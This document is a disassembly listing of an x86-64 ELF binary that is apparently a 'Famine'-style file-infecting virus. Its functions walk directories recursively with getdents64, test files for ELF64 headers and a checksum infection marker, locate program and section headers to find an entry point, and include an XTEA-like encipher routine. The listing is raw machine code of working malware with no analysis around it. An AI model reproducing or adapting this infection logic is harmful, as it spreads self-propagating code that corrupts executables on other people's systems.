    24b5:	49 01 c1             	add    %rax,%r9
    24b8:	4d 31 c8             	xor    %r9,%r8
    24bb:	45 01 c2             	add    %r8d,%r10d
    24be:	48 01 f8             	add    %rdi,%rax
    24c1:	4d 89 d0             	mov    %r10,%r8
    24c4:	49 c1 e0 04          	shl    $0x4,%r8
    24c8:	4d 89 d1             	mov    %r10,%r9
    24cb:	49 c1 e9 05          	shr    $0x5,%r9
    24cf:	4d 31 c8             	xor    %r9,%r8
    24d2:	4d 01 d0             	add    %r10,%r8
    24d5:	49 89 c1             	mov    %rax,%r9
    24d8:	49 c1 e9 0b          	shr    $0xb,%r9
    24dc:	49 83 e1 03          	and    $0x3,%r9
    24e0:	49 c1 e1 02          	shl    $0x2,%r9
    24e4:	49 01 d1             	add    %rdx,%r9
    24e7:	45 8b 09             	mov    (%r9),%r9d
    24ea:	49 01 c1             	add    %rax,%r9
    24ed:	4d 31 c8             	xor    %r9,%r8
    24f0:	45 01 c3             	add    %r8d,%r11d
    24f3:	48 ff c9             	dec    %rcx
    24f6:	48 85 c9             	test   %rcx,%rcx
    24f9:	75 95                	jne    2490 <__loop_num_rounds>
    24fb:	4c 89 d8             	mov    %r11,%rax
    24fe:	48 c1 e0 20          	shl    $0x20,%rax
    2502:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
    2507:	49 21 ca             	and    %rcx,%r10
    250a:	4c 09 d0             	or     %r10,%rax
    250d:	48 89 06             	mov    %rax,(%rsi)
    2510:	48 83 c6 08          	add    $0x8,%rsi
    2514:	49 83 ed 08          	sub    $0x8,%r13

0000000000002518 <__while_size_ge_8>:
    2518:	49 83 fd 08          	cmp    $0x8,%r13
    251c:	0f 8d 56 ff ff ff    	jge    2478 <encipher>
    2522:	41 5d                	pop    %r13
    2524:	41 5c                	pop    %r12
    2526:	c9                   	leaveq 
    2527:	c3                   	retq   
    2528:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    252f:	00 

0000000000002530 <infect_files_in>:
    2530:	55                   	push   %rbp
    2531:	48 89 e5             	mov    %rsp,%rbp
    2534:	48 81 ec 20 10 00 00 	sub    $0x1020,%rsp
    253b:	48 8d 85 f0 ef ff ff 	lea    -0x1010(%rbp),%rax
    2542:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2546:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
    254a:	48 89 c7             	mov    %rax,%rdi
    254d:	e8 6e ee ff ff       	callq  13c0 <ft_strcpy>
    2552:	48 8d 8d f0 ef ff ff 	lea    -0x1010(%rbp),%rcx
    2559:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    255d:	48 89 85 e8 ef ff ff 	mov    %rax,-0x1018(%rbp)
    2564:	48 89 8d e0 ef ff ff 	mov    %rcx,-0x1020(%rbp)
    256b:	e8 a0 ed ff ff       	callq  1310 <ft_strlen>
    2570:	48 8b 8d e0 ef ff ff 	mov    -0x1020(%rbp),%rcx
    2577:	48 01 c1             	add    %rax,%rcx
    257a:	48 8b bd e0 ef ff ff 	mov    -0x1020(%rbp),%rdi
    2581:	48 89 ce             	mov    %rcx,%rsi
    2584:	e8 17 00 00 00       	callq  25a0 <infect_files_at>
    2589:	48 81 c4 20 10 00 00 	add    $0x1020,%rsp
    2590:	5d                   	pop    %rbp
    2591:	c3                   	retq   
    2592:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    2599:	00 00 00 
    259c:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000025a0 <infect_files_at>:
    25a0:	55                   	push   %rbp
    25a1:	48 89 e5             	mov    %rsp,%rbp
    25a4:	48 81 ec 20 04 00 00 	sub    $0x420,%rsp
    25ab:	31 c0                	xor    %eax,%eax
    25ad:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    25b1:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    25b5:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    25b9:	89 c6                	mov    %eax,%esi
    25bb:	b0 00                	mov    $0x0,%al
    25bd:	e8 3e f0 ff ff       	callq  1600 <famine_open>
    25c2:	89 85 ec fb ff ff    	mov    %eax,-0x414(%rbp)
    25c8:	83 bd ec fb ff ff ff 	cmpl   $0xffffffff,-0x414(%rbp)
    25cf:	0f 85 05 00 00 00    	jne    25da <infect_files_at+0x3a>
    25d5:	e9 68 00 00 00       	jmpq   2642 <infect_files_at+0xa2>
    25da:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    25de:	48 89 c1             	mov    %rax,%rcx
    25e1:	48 81 c1 01 00 00 00 	add    $0x1,%rcx
    25e8:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
    25ec:	c6 00 2f             	movb   $0x2f,(%rax)
    25ef:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
    25f6:	8b bd ec fb ff ff    	mov    -0x414(%rbp),%edi
    25fc:	48 89 c6             	mov    %rax,%rsi
    25ff:	ba 00 04 00 00       	mov    $0x400,%edx
    2604:	e8 07 f1 ff ff       	callq  1710 <famine_getdents64>
    2609:	89 85 e8 fb ff ff    	mov    %eax,-0x418(%rbp)
    260f:	83 f8 00             	cmp    $0x0,%eax
    2612:	0f 8e 1f 00 00 00    	jle    2637 <infect_files_at+0x97>
    2618:	48 8d 95 f0 fb ff ff 	lea    -0x410(%rbp),%rdx
    261f:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    2623:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2627:	8b 8d e8 fb ff ff    	mov    -0x418(%rbp),%ecx
    262d:	e8 1e 00 00 00       	callq  2650 <browse_dirent>
    2632:	e9 b8 ff ff ff       	jmpq   25ef <infect_files_at+0x4f>
    2637:	8b bd ec fb ff ff    	mov    -0x414(%rbp),%edi
    263d:	e8 de ef ff ff       	callq  1620 <famine_close>
    2642:	48 81 c4 20 04 00 00 	add    $0x420,%rsp
    2649:	5d                   	pop    %rbp
    264a:	c3                   	retq   
    264b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000002650 <browse_dirent>:
    2650:	55                   	push   %rbp
    2651:	48 89 e5             	mov    %rsp,%rbp
    2654:	48 83 ec 40          	sub    $0x40,%rsp
    2658:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    265c:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2660:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    2664:	89 4d e4             	mov    %ecx,-0x1c(%rbp)
    2667:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
    266e:	8b 45 e0             	mov    -0x20(%rbp),%eax
    2671:	3b 45 e4             	cmp    -0x1c(%rbp),%eax
    2674:	0f 8d a3 00 00 00    	jge    271d <browse_dirent+0xcd>
    267a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    267e:	48 63 4d e0          	movslq -0x20(%rbp),%rcx
    2682:	48 01 c8             	add    %rcx,%rax
    2685:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    2689:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    268d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2691:	48 05 13 00 00 00    	add    $0x13,%rax
    2697:	48 89 c6             	mov    %rax,%rsi
    269a:	e8 21 ed ff ff       	callq  13c0 <ft_strcpy>
    269f:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    26a3:	0f be 51 13          	movsbl 0x13(%rcx),%edx
    26a7:	83 fa 2e             	cmp    $0x2e,%edx
    26aa:	0f 84 5a 00 00 00    	je     270a <browse_dirent+0xba>
    26b0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    26b4:	0f b6 48 12          	movzbl 0x12(%rax),%ecx
    26b8:	83 f9 04             	cmp    $0x4,%ecx
    26bb:	0f 85 3b 00 00 00    	jne    26fc <browse_dirent+0xac>
    26c1:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    26c5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    26c9:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    26cd:	48 81 c1 13 00 00 00 	add    $0x13,%rcx
    26d4:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
    26d8:	48 89 cf             	mov    %rcx,%rdi
    26db:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    26df:	e8 2c ec ff ff       	callq  1310 <ft_strlen>
    26e4:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    26e8:	48 01 c1             	add    %rax,%rcx
    26eb:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
    26ef:	48 89 ce             	mov    %rcx,%rsi
    26f2:	e8 a9 fe ff ff       	callq  25a0 <infect_files_at>
    26f7:	e9 09 00 00 00       	jmpq   2705 <browse_dirent+0xb5>
    26fc:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
    2700:	e8 7b 04 00 00       	callq  2b80 <infect_if_candidate>
    2705:	e9 00 00 00 00       	jmpq   270a <browse_dirent+0xba>
    270a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    270e:	0f b7 48 10          	movzwl 0x10(%rax),%ecx
    2712:	03 4d e0             	add    -0x20(%rbp),%ecx
    2715:	89 4d e0             	mov    %ecx,-0x20(%rbp)
    2718:	e9 51 ff ff ff       	jmpq   266e <browse_dirent+0x1e>
    271d:	48 83 c4 40          	add    $0x40,%rsp
    2721:	5d                   	pop    %rbp
    2722:	c3                   	retq   
    2723:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    272a:	00 00 00 
    272d:	0f 1f 00             	nopl   (%rax)

0000000000002730 <find_entry>:
    2730:	55                   	push   %rbp
    2731:	48 89 e5             	mov    %rsp,%rbp
    2734:	48 83 ec 50          	sub    $0x50,%rsp
    2738:	31 c0                	xor    %eax,%eax
    273a:	89 c1                	mov    %eax,%ecx
    273c:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    2740:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
    2744:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    2748:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    274c:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2750:	48 89 cf             	mov    %rcx,%rdi
    2753:	b9 40 00 00 00       	mov    $0x40,%ecx
    2758:	48 89 75 b8          	mov    %rsi,-0x48(%rbp)
    275c:	48 89 ce             	mov    %rcx,%rsi
    275f:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
    2763:	e8 e8 f4 ff ff       	callq  1c50 <safe_accessor>
    2768:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    276c:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
    2771:	0f 85 09 00 00 00    	jne    2780 <find_entry+0x50>
    2777:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    277b:	e9 e8 00 00 00       	jmpq   2868 <find_entry+0x138>
    2780:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2784:	48 8b 40 18          	mov    0x18(%rax),%rax
    2788:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    278c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2790:	48 89 c7             	mov    %rax,%rdi
    2793:	be 28 00 00 00       	mov    $0x28,%esi
    2798:	e8 83 ea ff ff       	callq  1220 <ft_bzero>
    279d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    27a1:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    27a5:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    27a9:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    27ad:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    27b1:	48 8d 15 c8 00 00 00 	lea    0xc8(%rip),%rdx        # 2880 <find_entry_phdr>
    27b8:	48 89 c1             	mov    %rax,%rcx
    27bb:	e8 d0 05 00 00       	callq  2d90 <foreach_phdr>
    27c0:	a8 01                	test   $0x1,%al
    27c2:	0f 85 09 00 00 00    	jne    27d1 <find_entry+0xa1>
    27c8:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    27cc:	e9 97 00 00 00       	jmpq   2868 <find_entry+0x138>
    27d1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    27d5:	48 83 38 00          	cmpq   $0x0,(%rax)
    27d9:	0f 85 09 00 00 00    	jne    27e8 <find_entry+0xb8>
    27df:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    27e3:	e9 80 00 00 00       	jmpq   2868 <find_entry+0x138>
    27e8:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    27ec:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    27f0:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    27f4:	48 8d 15 45 01 00 00 	lea    0x145(%rip),%rdx        # 2940 <find_entry_shdr>
    27fb:	48 89 c1             	mov    %rax,%rcx
    27fe:	e8 0d 07 00 00       	callq  2f10 <foreach_shdr>
    2803:	a8 01                	test   $0x1,%al
    2805:	0f 85 09 00 00 00    	jne    2814 <find_entry+0xe4>
    280b:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    280f:	e9 54 00 00 00       	jmpq   2868 <find_entry+0x138>
    2814:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2818:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
    281d:	0f 85 09 00 00 00    	jne    282c <find_entry+0xfc>
    2823:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2827:	e9 3c 00 00 00       	jmpq   2868 <find_entry+0x138>
    282c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2830:	48 8b 40 08          	mov    0x8(%rax),%rax
    2834:	48 8b 40 10          	mov    0x10(%rax),%rax
    2838:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    283c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2840:	48 2b 45 c0          	sub    -0x40(%rbp),%rax
    2844:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    2848:	48 89 41 20          	mov    %rax,0x20(%rcx)
    284c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2850:	48 83 78 18 00       	cmpq   $0x0,0x18(%rax)
    2855:	0f 85 09 00 00 00    	jne    2864 <find_entry+0x134>
    285b:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    285f:	e9 04 00 00 00       	jmpq   2868 <find_entry+0x138>
    2864:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2868:	8a 45 ff             	mov    -0x1(%rbp),%al
    286b:	24 01                	and    $0x1,%al
    286d:	0f b6 c0             	movzbl %al,%eax
    2870:	48 83 c4 50          	add    $0x50,%rsp
    2874:	5d                   	pop    %rbp
    2875:	c3                   	retq   
    2876:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    287d:	00 00 00 

0000000000002880 <find_entry_phdr>:
    2880:	55                   	push   %rbp
    2881:	48 89 e5             	mov    %rsp,%rbp
    2884:	48 83 ec 50          	sub    $0x50,%rsp
    2888:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    288c:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2890:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2894:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    2898:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    289c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    28a0:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    28a4:	48 8b 00             	mov    (%rax),%rax
    28a7:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    28ab:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    28af:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    28b3:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    28b7:	be 38 00 00 00       	mov    $0x38,%esi
    28bc:	e8 8f f3 ff ff       	callq  1c50 <safe_accessor>
    28c1:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    28c5:	48 83 7d c0 00       	cmpq   $0x0,-0x40(%rbp)
    28ca:	0f 85 09 00 00 00    	jne    28d9 <find_entry_phdr+0x59>
    28d0:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    28d4:	e9 52 00 00 00       	jmpq   292b <find_entry_phdr+0xab>
    28d9:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    28dd:	48 8b 40 10          	mov    0x10(%rax),%rax
    28e1:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    28e5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    28e9:	48 8b 40 28          	mov    0x28(%rax),%rax
    28ed:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    28f1:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    28f5:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
    28f9:	48 3b 41 08          	cmp    0x8(%rcx),%rax
    28fd:	0f 87 24 00 00 00    	ja     2927 <find_entry_phdr+0xa7>
    2903:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2907:	48 8b 40 08          	mov    0x8(%rax),%rax
    290b:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
    290f:	48 03 4d b0          	add    -0x50(%rbp),%rcx
    2913:	48 39 c8             	cmp    %rcx,%rax
    2916:	0f 83 0b 00 00 00    	jae    2927 <find_entry_phdr+0xa7>
    291c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    2920:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2924:	48 89 01             	mov    %rax,(%rcx)
    2927:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    292b:	8a 45 ff             	mov    -0x1(%rbp),%al
    292e:	24 01                	and    $0x1,%al
    2930:	0f b6 c0             	movzbl %al,%eax
    2933:	48 83 c4 50          	add    $0x50,%rsp
    2937:	5d                   	pop    %rbp
    2938:	c3                   	retq   
    2939:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000002940 <find_entry_shdr>:
    2940:	55                   	push   %rbp
    2941:	48 89 e5             	mov    %rsp,%rbp
    2944:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
    294b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    294f:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2953:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2957:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    295b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    295f:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2963:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2967:	48 8b 00             	mov    (%rax),%rax
    296a:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    296e:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    2972:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2976:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    297a:	be 40 00 00 00       	mov    $0x40,%esi
    297f:	e8 cc f2 ff ff       	callq  1c50 <safe_accessor>
    2984:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    2988:	48 83 7d c0 00       	cmpq   $0x0,-0x40(%rbp)
    298d:	0f 85 09 00 00 00    	jne    299c <find_entry_shdr+0x5c>
    2993:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2997:	e9 cd 00 00 00       	jmpq   2a69 <find_entry_shdr+0x129>
    299c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    29a0:	48 8b 40 10          	mov    0x10(%rax),%rax
    29a4:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    29a8:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    29ac:	48 8b 40 20          	mov    0x20(%rax),%rax
    29b0:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    29b4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    29b8:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
    29bc:	48 3b 41 08          	cmp    0x8(%rcx),%rax
    29c0:	0f 87 25 00 00 00    	ja     29eb <find_entry_shdr+0xab>
    29c6:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    29ca:	48 8b 40 08          	mov    0x8(%rax),%rax
    29ce:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
    29d2:	48 03 4d b0          	add    -0x50(%rbp),%rcx
    29d6:	48 39 c8             	cmp    %rcx,%rax
    29d9:	0f 83 0c 00 00 00    	jae    29eb <find_entry_shdr+0xab>
    29df:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    29e3:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    29e7:	48 89 41 08          	mov    %rax,0x8(%rcx)
    29eb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29ef:	48 8b 00             	mov    (%rax),%rax
    29f2:	48 8b 40 08          	mov    0x8(%rax),%rax
    29f6:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    29fa:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    29fe:	48 8b 40 18          	mov    0x18(%rax),%rax
    2a02:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    2a06:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2a0a:	48 8b 00             	mov    (%rax),%rax
    2a0d:	48 8b 40 20          	mov    0x20(%rax),%rax
    2a11:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    2a15:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    2a19:	48 03 45 98          	add    -0x68(%rbp),%rax
    2a1d:	48 89 45 90          	mov    %rax,-0x70(%rbp)
    2a21:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
    2a25:	48 03 45 b0          	add    -0x50(%rbp),%rax
    2a29:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    2a2d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    2a31:	48 3b 45 90          	cmp    -0x70(%rbp),%rax
    2a35:	0f 87 2a 00 00 00    	ja     2a65 <find_entry_shdr+0x125>
    2a3b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    2a3f:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2a43:	48 3b 41 18          	cmp    0x18(%rcx),%rax
    2a47:	0f 86 18 00 00 00    	jbe    2a65 <find_entry_shdr+0x125>
    2a4d:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    2a51:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2a55:	48 89 41 10          	mov    %rax,0x10(%rcx)
    2a59:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    2a5d:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2a61:	48 89 41 18          	mov    %rax,0x18(%rcx)
    2a65:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2a69:	8a 45 ff             	mov    -0x1(%rbp),%al
    2a6c:	24 01                	and    $0x1,%al
    2a6e:	0f b6 c0             	movzbl %al,%eax
    2a71:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
    2a78:	5d                   	pop    %rbp
    2a79:	c3                   	retq   
    2a7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000002a80 <can_infect>:
    2a80:	55                   	push   %rbp
    2a81:	48 89 e5             	mov    %rsp,%rbp
    2a84:	48 83 ec 40          	sub    $0x40,%rsp
    2a88:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    2a8c:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
    2a90:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    2a94:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2a98:	48 8b 40 08          	mov    0x8(%rax),%rax
    2a9c:	48 8b 40 18          	mov    0x18(%rax),%rax
    2aa0:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    2aa4:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2aa8:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    2aac:	48 03 41 20          	add    0x20(%rcx),%rax
    2ab0:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2ab4:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2ab8:	48 05 05 00 00 00    	add    $0x5,%rax
    2abe:	48 05 38 00 00 00    	add    $0x38,%rax
    2ac4:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    2ac8:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
    2acc:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2ad0:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2ad4:	be 40 00 00 00       	mov    $0x40,%esi
    2ad9:	e8 72 f1 ff ff       	callq  1c50 <safe_accessor>
    2ade:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    2ae2:	48 83 7d c0 00       	cmpq   $0x0,-0x40(%rbp)
    2ae7:	0f 85 09 00 00 00    	jne    2af6 <can_infect+0x76>
    2aed:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2af1:	e9 27 00 00 00       	jmpq   2b1d <can_infect+0x9d>
    2af6:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
    2afa:	be 40 00 00 00       	mov    $0x40,%esi
    2aff:	e8 2c 00 00 00       	callq  2b30 <checksum>
    2b04:	48 3d 26 15 00 00    	cmp    $0x1526,%rax
    2b0a:	0f 85 09 00 00 00    	jne    2b19 <can_infect+0x99>
    2b10:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2b14:	e9 04 00 00 00       	jmpq   2b1d <can_infect+0x9d>
    2b19:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2b1d:	8a 45 ff             	mov    -0x1(%rbp),%al
    2b20:	24 01                	and    $0x1,%al
    2b22:	0f b6 c0             	movzbl %al,%eax
    2b25:	48 83 c4 40          	add    $0x40,%rsp
    2b29:	5d                   	pop    %rbp
    2b2a:	c3                   	retq   
    2b2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000002b30 <checksum>:
    2b30:	55                   	push   %rbp
    2b31:	48 89 e5             	mov    %rsp,%rbp
    2b34:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2b38:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2b3c:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
    2b43:	00 
    2b44:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2b48:	48 89 c1             	mov    %rax,%rcx
    2b4b:	48 81 c1 ff ff ff ff 	add    $0xffffffffffffffff,%rcx
    2b52:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
    2b56:	48 83 f8 00          	cmp    $0x0,%rax
    2b5a:	0f 84 1a 00 00 00    	je     2b7a <checksum+0x4a>
    2b60:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b64:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2b68:	48 0f be 04 08       	movsbq (%rax,%rcx,1),%rax
    2b6d:	48 03 45 e8          	add    -0x18(%rbp),%rax
    2b71:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2b75:	e9 ca ff ff ff       	jmpq   2b44 <checksum+0x14>
    2b7a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2b7e:	5d                   	pop    %rbp
    2b7f:	c3                   	retq   

0000000000002b80 <infect_if_candidate>:
    2b80:	55                   	push   %rbp
    2b81:	48 89 e5             	mov    %rsp,%rbp
    2b84:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
    2b8b:	31 f6                	xor    %esi,%esi
    2b8d:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    2b91:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    2b95:	b0 00                	mov    $0x0,%al
    2b97:	e8 64 ea ff ff       	callq  1600 <famine_open>
    2b9c:	89 45 8c             	mov    %eax,-0x74(%rbp)
    2b9f:	83 7d 8c 00          	cmpl   $0x0,-0x74(%rbp)
    2ba3:	0f 8d 09 00 00 00    	jge    2bb2 <infect_if_candidate+0x32>
    2ba9:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2bad:	e9 18 01 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2bb2:	8b 7d 8c             	mov    -0x74(%rbp),%edi
    2bb5:	48 8d 45 90          	lea    -0x70(%rbp),%rax
    2bb9:	48 89 c6             	mov    %rax,%rsi
    2bbc:	ba 40 00 00 00       	mov    $0x40,%edx
    2bc1:	e8 fa e9 ff ff       	callq  15c0 <famine_read>
    2bc6:	48 83 f8 40          	cmp    $0x40,%rax
    2bca:	0f 8d 11 00 00 00    	jge    2be1 <infect_if_candidate+0x61>
    2bd0:	8b 7d 8c             	mov    -0x74(%rbp),%edi
    2bd3:	e8 48 ea ff ff       	callq  1620 <famine_close>
    2bd8:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2bdc:	e9 e9 00 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2be1:	48 8d 7d 90          	lea    -0x70(%rbp),%rdi
    2be5:	e8 f6 00 00 00       	callq  2ce0 <elf64_identifier>
    2bea:	a8 01                	test   $0x1,%al
    2bec:	0f 85 11 00 00 00    	jne    2c03 <infect_if_candidate+0x83>
    2bf2:	8b 7d 8c             	mov    -0x74(%rbp),%edi
    2bf5:	e8 26 ea ff ff       	callq  1620 <famine_close>
    2bfa:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2bfe:	e9 c7 00 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2c03:	8b 7d 8c             	mov    -0x74(%rbp),%edi
    2c06:	e8 15 ea ff ff       	callq  1620 <famine_close>
